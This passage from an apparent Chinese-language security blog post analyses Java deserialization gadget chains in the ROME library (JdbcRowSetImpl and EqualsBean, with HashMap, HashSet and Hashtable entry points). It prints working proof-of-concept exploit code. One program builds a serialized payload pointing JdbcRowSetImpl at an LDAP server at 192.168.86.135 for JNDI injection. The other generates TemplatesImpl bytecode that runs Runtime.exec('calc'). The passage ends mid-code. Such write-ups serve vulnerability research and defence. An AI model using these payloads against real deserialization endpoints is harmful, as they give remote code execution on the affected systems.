data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882570302-f8f4de14-e895-4cec-96bc-a36621a8698e.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=323&id=u63010627&originHeight=606&originWidth=1439&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=324623&status=done&style=none&taskId=ud9f0da86-a800-490b-a06a-470ae60583d&title=&width=767.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>那参数可控的限制也解除，现在只需要考虑入口点怎么选了，其实前面的触发点都能够作为我们这里的入口点，JdbcRowImpl 的攻击手段在 ROME 反序列化中属于一个后续利用，也就是说我们可以不用去通过加载恶意类实现 RCE 了</p>
<h3 id="1x01-攻击实现"><a href="#1x01-攻击实现" class="headerlink" title="1x01 攻击实现"></a>1x01 攻击实现</h3><p>先看 hashmap 的入口</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>
<span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>
<span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                  
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>
<span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">.</span>getDataSourceName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择 hashmap<br>这里 JNDI 注入有很多选择，自己本地起一个 LDAP 或者 RMI 服务，或者用其他工具起也行，我这里用的 Yakit<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711886346857-743df9cf-c566-4026-ac4c-c9bf427e4f58.png#averageHue=%23e4d6a8&clientId=u9f9b8bcd-7272-4&from=paste&height=416&id=uf86c78a8&originHeight=1011&originWidth=606&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50269&status=done&style=none&taskId=ua118d734-2db7-4849-a710-4d4b5e0ef36&title=&width=249.20001220703125" referrerpolicy="no-referrer" alt="image.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span></span><span class="token class-name">JdbcRowSetImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPOC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>


        <span class="token class-name">JdbcRowSetImpl</span> <span class="token constant">JRSI</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token constant">JRSI</span><span class="token punctuation">.</span><span class="token function">setDataSourceName</span><span class="token punctuation">(</span><span class="token string">"ldap://192.168.86.135:8078/BkooPVXv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token constant">JRSI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_cloneableBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"_toStringBean"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token function">unSerial</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 输出序列化的Base64编码字符</span>
        <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Map</span> hashMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x06-EqualsBean链"><a href="#0x06-EqualsBean链" class="headerlink" title="0x06 EqualsBean链"></a>0x06 EqualsBean链</h2><p>上文我们第一次分析 ObjectBean 链的时候就途径 EqualsBean， 其实 EqualsBean 本身就能够当作和 toStringBean 一类的最终触发点，这里只不过要想调用 get 方法需要通过其 beanEquals 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png#averageHue=%232b2e33&clientId=u9f9b8bcd-7272-4&from=paste&height=251&id=uf3f50569&originHeight=470&originWidth=1453&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=217087&status=done&style=none&taskId=u34e9a0ee-093c-4380-b7f3-b6342f58d49&title=&width=774.9333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<h3 id="1x01-流程分析-1"><a href="#1x01-流程分析-1" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>equalsBean 的组件分析文章开头分析过了，这里就直接分析攻击链了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashSet</span><span class="token punctuation">.</span>readObject
<span class="token class-name">HashMap</span><span class="token punctuation">.</span>put
<span class="token class-name">HashMap</span><span class="token punctuation">.</span>putval
<span class="token class-name">HashMap</span><span class="token punctuation">.</span>equals
<span class="token class-name">AbastractMap</span><span class="token punctuation">.</span>equals
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>equals
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>beanEquals
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实这里 HashSet 也算是一个新的入口点，对于EqualsBean 方向的攻击来说，只要能够触发到 equals 方法，我们都能接着往下走，所以前面还能换成</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashTable</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>
<span class="token class-name">HashTable</span><span class="token punctuation">.</span><span class="token function">reconstitutionPut</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name">HashMap</span><span class="token punctuation">.</span>equals
<span class="token class-name">AbastractMap</span><span class="token punctuation">.</span>equals
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>equals
<span class="token class-name">EqualsBean</span><span class="token punctuation">.</span>beanEquals
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>hashtable 的 hash 碰撞就不讲了，但是 hashset 的处理方式要讲一下，跟 hashtable 的 hash 碰撞差不多，都是利用 yy zZ 两个字符串算出来的 hash 值相同</p>
<h4 id="2x01-hashSet-分析"><a href="#2x01-hashSet-分析" class="headerlink" title="2x01 hashSet 分析"></a>2x01 hashSet 分析</h4><p>我们来到它的 readObject 方法相关的 for 循环<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893479163-ac99e55f-da5f-463c-9dfe-a194d87d0020.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=148&id=u34b2d9e5&originHeight=277&originWidth=1021&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79634&status=done&style=none&taskId=u36d2ef01-0d01-4dc0-a2d5-e00203883a1&title=&width=544.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>这里 map 默认会被赋值为 hashmap，所以之后会调用 hashmap 的 put 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893529777-147a23db-c6bf-4412-8333-d5fb82e0b192.png#averageHue=%232d3034&clientId=u9f9b8bcd-7272-4&from=paste&height=94&id=u23479a3a&originHeight=177&originWidth=1322&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=83201&status=done&style=none&taskId=uca6d7323-5e53-4a57-9003-d3af67a2613&title=&width=705.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>熟悉的调用 putval，第一次进由于缓存 tab 里面没有值，所以第一次 if 判断 p 是否为空是一定满足不了的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893572688-562a7874-a979-4849-8a30-9126a3f78439.png#averageHue=%232c2f33&clientId=u9f9b8bcd-7272-4&from=paste&height=313&id=u53e1767c&originHeight=586&originWidth=1405&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=253812&status=done&style=none&taskId=u789240af-6271-4307-9d99-d74145df717&title=&width=749.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>所以这里我们可能考虑要 hashset add 两次 equalsbean，不然第二次进入 putval 会报空错。<br>想要调用到 equals 方法，if 判断条件中，第一个判断<code>p.hash == hash</code>也必须过，这里如果是直接 add 两个equalsbean 就不用管，算出来肯定一样（但是后续就要考虑和 hashtable 同样的 hash 碰撞了）<br>第二次进入之后，顺利来到下面的这层判断，准备触发 equals</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> p<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果我们刚才直接给 hashset add 进 equalsbean ，其中传入 equals 方法的参数 k 还是 equalsbean，这也不行，我们考虑其中加一层 hashmap 来包裹 equalsbean</p>
<p>hashmap 的 equals 方法会调用到它的抽象类 Abstractmap 的 equals 方法，在它的 quals 方法中，他首先会通过 Iterator 迭代器，对我们当前 hashmap 作用，能够访问到当前 hashmap 的各个键值对。<br>这里就是调用了 next 方法，取第二个键值对(假设此时键值对&lt;a,a&gt; &lt;b,b&gt;) &lt;b,b&gt;，然后取出它的 key 和 value，各为 b。然后这里调用 b 的 equals 方法，参数是 m 的键值 value，m 是什么？上面代码中制定了 m 是我们当前的 hashmap。key 是我们刚才取出的 b，也就是说，它会在两个 hashmap 中相互取值，这里比较绕，我们之后看 POC 能明白些<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711893997609-679aa67c-37d9-4a6c-8043-905661e7dc52.png#averageHue=%232d3139&clientId=u9f9b8bcd-7272-4&from=paste&height=259&id=NMqob&originHeight=485&originWidth=1750&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264352&status=done&style=none&taskId=ufad6fc35-9678-47b0-a6fc-0aaf0f756e7&title=&width=933.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="2x02-攻击流程分析"><a href="#2x02-攻击流程分析" class="headerlink" title="2x02 攻击流程分析"></a>2x02 攻击流程分析</h4><p>上述难关通关后，就可以正常调用链了，如果思路没错的话，我们直接看 POC，经测试，不论是 hashtable 还是 hashset 都能够这么用，各自的条件都已经注释好了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EqualsBeanPOC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">EqualsBean</span> bean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//EqualsBean bean2 =new EqualsBean(String.class, "s");</span>


        <span class="token class-name">HashMap</span> map1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
